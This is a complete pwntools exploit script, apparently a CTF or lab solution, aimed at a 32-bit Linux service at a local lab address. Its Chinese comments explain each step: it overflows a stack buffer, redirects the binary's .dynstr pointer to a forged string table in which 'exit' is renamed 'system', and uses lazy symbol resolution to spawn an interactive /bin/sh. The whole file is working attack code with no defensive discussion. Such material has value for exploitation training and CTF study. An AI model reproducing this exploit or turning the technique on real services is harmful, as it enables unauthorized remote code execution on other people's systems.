#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(os = 'linux', arch = 'i386')

call_exit_addr = 0x08048495
read_plt = 0x08048300
start_addr = 0x08048350
dynstr_d_ptr_address = 0x080496a4
fake_dynstr_address = 0x08049800
fake_dynstr_data = "\x00libc.so.6\x00_IO_stdin_used\x00system\x00\x00\x00\x00\x00\x00read\x00__libc_start_main\x00__gmon_start__\x00GLIBC_2.0\x00"

io = remote("172.17.0.2", 10001)

payload = ""
payload += 'A'*22						#padding
payload += p32(read_plt)				#修改.dynstr对应的Elf32_Dyn.d_ptr
payload += p32(start_addr)				
payload += p32(0)						
payload += p32(dynstr_d_ptr_address)	
payload += p32(4)						
io.send(payload)
sleep(0.5)
io.send(p32(fake_dynstr_address))		#新的.dynstr地址
sleep(0.5)

payload = ""
payload += 'A'*22						#padding
payload += p32(read_plt)				#在内存中伪造一块.dynstr字符串
payload += p32(start_addr)				
payload += p32(0)		
payload += p32(fake_dynstr_address)
payload += p32(len(fake_dynstr_data)+8)	#长度是.dynstr加上8，把"/bin/sh\x00"接在后面
io.send(payload)
sleep(0.5)
io.send(fake_dynstr_data+"/bin/sh\x00")	#把/bin/sh\x00接在后面
sleep(0.5)

payload = ""
payload += 'A'*22
payload += p32(call_exit_addr)			#伪造的.dynstr中exit被修改成了system，因此exit函数第一次被调用时函数重定位，顺着结构体找到了system，解析成system的首地址
payload += p32(fake_dynstr_address+len(fake_dynstr_data))	#调用的是call exit,所以直接把预先构造好的字符串"/bin/sh\x00"的地址进栈
io.send(payload)
io.interactive()